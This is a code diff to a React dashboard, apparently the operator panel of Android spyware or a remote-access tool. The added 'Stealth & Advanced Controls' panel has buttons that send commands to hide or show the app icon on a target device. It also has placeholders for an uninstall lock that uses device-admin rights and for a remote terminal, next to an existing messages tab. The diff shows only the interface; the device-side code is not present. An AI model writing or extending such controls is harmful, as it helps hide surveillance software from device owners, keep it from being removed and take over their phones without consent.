@@ -114,6 +114,32 @@ export default function Dashboard() {
         <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-center text-gray-500">
            {subTab === 'Messages (200)' ? 'Messages will appear here...' : 'Feature coming soon...'}
         </div>
+      
+            {/* STEALTH & ADVANCED BOX */}
+            <div className="bg-[#1A1B23] p-5 rounded-xl border border-purple-900 mb-6 shadow-[0_0_15px_rgba(139,92,246,0.15)]">
+              <h3 className="text-md font-bold text-purple-400 mb-4 flex items-center gap-2">
+                <span>🕵️</span> Stealth & Advanced Controls
+              </h3>
+              <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                <button onClick={() => sendCommand('HIDE_ICON')} className="bg-black border border-purple-800 hover:bg-purple-900 text-white p-3 rounded-lg flex flex-col items-center gap-1 transition">
+                  <span className="text-xl">🙈</span>
+                  <span className="text-xs font-bold">Hide App Icon</span>
+                </button>
+                <button onClick={() => sendCommand('SHOW_ICON')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1 transition">
+                  <span className="text-xl">👁️</span>
+                  <span className="text-xs font-bold">Show App Icon</span>
+                </button>
+                <button onClick={() => alert('Device Admin Lock is Active in APK')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1 transition">
+                  <span className="text-xl">🔒</span>
+                  <span className="text-xs font-bold">Uninstall Lock</span>
+                </button>
+                <button onClick={() => alert('Terminal is opening...')} className="bg-black border border-gray-700 hover:bg-gray-800 text-white p-3 rounded-lg flex flex-col items-center gap-1 transition">
+                  <span className="text-xl">💻</span>
+                  <span className="text-xs font-bold">Terminal</span>
+                </button>
+              </div>
+            </div>
+
       </main>
     </div>
   );
